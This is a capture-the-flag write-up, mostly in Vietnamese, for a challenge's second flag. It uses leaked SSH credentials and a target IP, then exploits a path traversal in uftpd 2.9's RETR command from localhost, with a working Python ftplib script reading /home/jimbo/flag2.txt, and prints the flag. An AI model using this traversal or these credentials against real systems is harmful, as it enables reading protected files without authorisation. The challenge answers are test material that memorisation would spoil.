# CIT pwn - Flag2 Writeup

## 1) Starting point

Từ bài 1 đã có credential:

- user: `greg`
- pass: `DXIjeNZC8Tf2SrjtRaWg1h4SZl5DZk6G`

SSH vào target:

```bash
ssh greg@23.179.17.69
```

## 2) Ý tưởng exploit

Service FTP `uftpd (2.9)` chạy trên `10921/tcp` có path traversal với lệnh `RETR`.

Hint nói không có root flag truyền thống, và trong `.bash_history` có dấu hiệu target là:

```text
/home/jimbo/flag2.txt
```

Không đọc trực tiếp được file này từ user `greg` vì permission bị chặn.

## 3) Lấy flag2 qua FTP traversal từ localhost

Khai thác ngay trên máy nạn nhân (qua SSH), dùng FTP client local truy xuất:

```python
RETR ../../../../home/jimbo/flag2.txt
```

Ví dụ nhanh:

```bash
python3 - <<'PY'
from ftplib import FTP
from io import BytesIO
ftp = FTP()
ftp.connect('127.0.0.1', 10921, timeout=10)
ftp.login('anonymous', 'anonymous')
buf = BytesIO()
ftp.retrbinary('RETR ../../../../home/jimbo/flag2.txt', buf.write)
ftp.quit()
print(buf.getvalue().decode())
PY
```

Kết quả:

```text
CIT{Br41n_bLa$t3R}
```

## Flag2

```text
CIT{Br41n_bLa$t3R}
```

## Solver script

`solve.py` tự động:

1. SSH vào host bằng `greg` credential
2. chạy Python trên remote để FTP `RETR ../../../../home/jimbo/flag2.txt`
3. parse và in `flag2`

Chạy:

```bash
pip install paramiko
python3 solve.py
```
